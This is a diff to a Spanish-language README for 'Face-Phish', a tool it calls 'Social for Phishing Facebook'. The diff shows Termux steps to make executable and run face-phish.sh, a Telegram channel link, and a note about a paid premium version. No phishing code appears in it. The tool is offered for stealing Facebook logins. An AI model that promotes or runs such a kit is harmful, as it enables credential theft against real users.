@@ -1,5 +1,5 @@
 # Face-Phish
-Social for Phishing Facebook 
+Social for Phishing Facebook [ version free ]
 
 # Instalacion en Termux
 
@@ -22,3 +22,5 @@ $ chmod +x face-phish.sh
 $ bash face-phish.sh
 
 # Telegram --> https://t.me/Linux_Informatic
+
+La version Premiun incluye mas personalizacion .
